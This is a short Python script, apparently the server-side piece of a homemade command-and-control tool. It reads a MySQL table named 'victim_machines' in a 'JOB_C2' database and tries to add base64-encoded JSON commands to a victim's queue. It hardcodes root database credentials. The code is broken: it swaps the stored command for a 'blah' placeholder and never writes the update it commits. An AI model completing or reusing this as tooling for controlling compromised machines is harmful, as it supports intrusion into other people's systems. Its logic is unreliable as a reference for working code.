#!/usr/bin/env python
import io
import re
import base64
import sys
import json
import mysql.connector
from mysql.connector import MySQLConnection, Error

def editcommand( id, command ):

	encoded_string = str(base64.b64encode(command.encode('ascii')))
	ends = re.finditer("'", encoded_string)
	ends_array = [index.start() for index in ends]
	new_command = encoded_string[ends_array[0]+1:ends_array[1]]

	query = """ SELECT command, command_output FROM victim_machines WHERE victim_id =%s """
	data = (id,)

	#https://www.mysqltutorial.org/python-mysql-update/
	try:
		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
		if connection.is_connected():
			print('Connected to JOB_C2 database')

		cursor = connection.cursor(buffered=True)
		cursor.execute(query,data)
		result = cursor.fetchall()
#		print(result[0][0])
		old_command = result[0][0]
		old_command_bytes = old_command.encode('ascii')
		decoded_old_bytes = base64.b64decode(old_command_bytes)
		#get the decoded json that was previously being stored in the db
		decoded_command = '{"1": "blah"}'

		json_data = json.loads(decoded_command)
		new_command = {str(len(json_data)+1): command}
		json_data.update(new_command)
#		print(json.dumps(json_data))

		json_string = str(json.dumps(json_data))
		#re-encode the new json which includes the updated command list
		updated_entry = json_string.encode('ascii')
		updated_bytes = base64.b64encode(updated_entry)
		encoded_updated = updated_bytes.decode('ascii')
#		print(encoded_updated)

		#update the database if the row already exists and create a new one if it doesn't

		connection.commit()

	except Error as error:
		print(error)

	finally:
		cursor.close()
		connection.close()

#	for i in range(len(data)):
#		indices = re.finditer(':', data[i])
#		indices_array = [index.start() for index in indices]
#		machine_id = re.finditer('=',data[i])
#		id_array = [index.start() for index in machine_id]
#		if i > 0 and id == data[i][id_array[0]+1:indices_array[0]]:
#			print('ID was found!')
#			location = i
#			#get the string value of the old command and replace it
#			old_command = data[location][indices_array[0]+1:indices_array[1]]
#			commands = json.loads(old_command)
#			#new_data = data[location].replace(old_command,new_command)
#			commands.update(new_command)
#			#set the new command in the data string
#			data[location] = commands
#			break

if __name__ == "__main__":
	editcommand(*sys.argv[1:])
